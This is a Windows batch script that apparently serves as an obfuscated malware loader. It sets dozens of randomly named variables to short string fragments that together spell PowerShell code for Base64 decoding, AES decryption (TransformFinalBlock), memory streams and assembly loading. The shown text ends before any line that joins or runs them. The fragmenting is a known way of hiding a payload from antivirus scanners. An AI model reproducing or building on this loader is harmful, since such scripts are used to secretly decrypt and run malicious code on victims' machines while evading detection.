@echo off
set "VmLnDAYMkc= New"
set "aGXzRHUgEs=ment"
set "OLXzgTwpcl=pose"
set "DWBAntpfyO=znUu"
set "cjfwnthaca=F) {"
set "JEgSQTsBsp=.Sec"
set "tsReRLTJTE=embl"
set "lFRMOatBku=isfL"
set "gSSpNkcQPp= '')"
set "ofXbsuyVYk='gni"
set "ZgSAQCVXHY=A = "
set "HdBYTwTYaT=16] "
set "djMbjzHXur=Fina"
set "TsMKysfPgP=]::N"
set "gCOAnlyqjT=ZYYc"
set "jEJRrFdceA=.Con"
set "qubzcVNTTM=ay()"
set "WHXKdQOqcf=cyiO"
set "DZWRZVyHgn=nage"
set "TtHdSZKSRL=ypto"
set "ERCsTyeLjf=:('g"
set "EJiqGhEjkN=0O+g"
set "eCgLnGCJvK=le  "
set "IxjjMYrTIL=pDZz"
set "CRLLKEyTxE=)) {"
set "TDgDApzAst=m.IO"
set "sITEBagTec=lBlo"
set "dOvqFIeVGm=ose("
set "hwALEdFqAW='[-1"
set "obiIvLEYye=Secu"
set "CkJDwcSBnV=esMa"
set "nSwNSzBkgM=GzOu"
set "DveallfZDJ=d;$A"
set "KvDFkKtGgD=ert]"
set "uuuNbLNGnb=).Sp"
set "IBclIWgvhG=.IO."
set "ziXoLBKZqV=ion."
set "zhkQauNXks=ss -"
set "vFqLjbbqhD=esFX"
set "WTXDxqvTIu=[Sys"
set "mtmycjoaVt=gth)"
set "KTqakhgIrk=e = "
set "LOQsPvIIFi=ewLi"
set "GTxRsMcLuY=oryS"
set "lbpZbCNFDa=$OkQ"
